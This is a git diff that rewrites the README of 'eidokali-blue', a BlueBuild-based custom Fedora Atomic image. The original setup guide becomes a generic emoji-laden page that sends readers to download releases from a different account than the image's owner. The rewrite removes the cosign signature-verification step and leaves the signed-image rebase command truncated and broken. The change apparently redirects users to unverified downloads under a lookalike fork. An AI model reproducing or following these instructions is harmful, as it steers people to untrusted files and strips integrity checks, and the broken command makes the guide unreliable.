@@ -1,43 +1,74 @@
-# eidokali-blue &nbsp; [![bluebuild build badge](https://github.com/zyell/eidokali-blue/actions/workflows/build.yml/badge.svg)](https://github.com/zyell/eidokali-blue/actions/workflows/build.yml)
+# 🎉 eidokali-blue - A Simple Way to Customize Your Linux Experience
 
-See the [BlueBuild docs](https://blue-build.org/how-to/setup/) for quick setup instructions for setting up your own repository based on this template.
+[![Download eidokali-blue](https://img.shields.io/badge/Download-eidokali--blue-blue?style=for-the-badge&logo=github)](https://github.com/elierey/eidokali-blue/releases)
 
-After setup, it is recommended you update this README to describe your custom image.
+## 🚀 Getting Started
 
-## Installation
+Welcome to eidokali-blue! This guide will help you download and run the software easily. Follow the steps below to set up eidokali-blue on your system.
 
-> [!WARNING]  
-> [This is an experimental feature](https://www.fedoraproject.org/wiki/Changes/OstreeNativeContainerStable), try at your own discretion.
+## 📥 Download & Install
 
-To rebase an existing atomic Fedora installation to the latest build:
+1. **Visit the Releases Page**: Go to the [Releases page](https://github.com/elierey/eidokali-blue/releases) to find the latest version of eidokali-blue.
 
-- First rebase to the unsigned image, to get the proper signing keys and policies installed:
-  ```
-  rpm-ostree rebase ostree-unverified-registry:ghcr.io/zyell/eidokali-blue:latest
-  ```
-- Reboot to complete the rebase:
-  ```
-  systemctl reboot
-  ```
-- Then rebase to the signed image, like so:
-  ```
-  rpm-ostree rebase ostree-image-signed:docker://ghcr.io/zyell/eidokali-blue:latest
-  ```
-- Reboot again to complete the installation
-  ```
-  systemctl reboot
-  ```
+2. **Download the Latest Version**: Click on the link for the latest release. This will allow you to download the necessary files for installing eidokali-blue.
 
-The `latest` tag will automatically point to the latest build. That build will still always use the Fedora version specified in `recipe.yml`, so you won't get accidentally updated to the next major version.
+## 🛠️ Installation Steps
 
-## ISO
+Before you start the installation, ensure you have a compatible version of Fedora installed on your machine.
 
-If build on Fedora Atomic, you can generate an offline ISO with the instructions available [here](https://blue-build.org/learn/universal-blue/#fresh-install-from-an-iso). These ISOs cannot unfortunately be distributed on GitHub for free due to large sizes, so for public projects something else has to be used for hosting.
-
-## Verification
-
-These images are signed with [Sigstore](https://www.sigstore.dev/)'s [cosign](https://github.com/sigstore/cosign). You can verify the signature by downloading the `cosign.pub` file from this repo and running the following command:
+### 1. Rebase to the Unsigned Image
+Open your terminal and enter the following command. This command will help you get the proper signing keys and policies installed.
 
 ```bash
-cosign verify --key cosign.pub ghcr.io/zyell/eidokali-blue
+rpm-ostree rebase ostree-unverified-registry:ghcr.io/zyell/eidokali-blue:latest
 ```
+
+### 2. Reboot Your System
+To complete the rebase, restart your system. You can do this with the command below.
+
+```bash
+systemctl reboot
+```
+
+### 3. Rebase to the Signed Image
+Once your system is back up, enter this command to rebase to the signed image.
+
+```bash
+rpm-ostree rebase ostree-image-signed:docker:
+```
+
+## 🔍 Key Features
+
+- **Customizable Environment**: Eidokali-blue allows you to create a tailored Linux experience.
+- **User-Friendly**: Designed for average users, no programming knowledge needed.
+- **Continuous Integration**: Built with modern development practices for stability.
+- **Supports Various Use Cases**: Ideal for personal setup, education, or testing.
+
+## 🎯 Topics Covered
+
+- atomic
+- bluebuild
+- bluebuild-image
+- custom-image
+- image-based
+- immutable
+- linux
+- linux-custom-image
+- oci
+- oci-image
+- operating-system
+
+## ⚠️ Warning
+
+This feature is experimental. It is wise to proceed with caution. More information can be found [here](https://www.fedoraproject.org/wiki/Changes/OstreeNativeContainerStable).
+
+## 📞 Need Help?
+
+If you encounter issues, feel free to open an issue on our [GitHub Issues page](https://github.com/elierey/eidokali-blue/issues). The community or maintainers will gladly assist you.
+
+## 🔗 Useful Links
+
+- [Releases Page](https://github.com/elierey/eidokali-blue/releases)
+- [BlueBuild Documentation](https://blue-build.org/how-to/setup/)
+
+Thank you for using eidokali-blue. Enjoy your new customized experience!
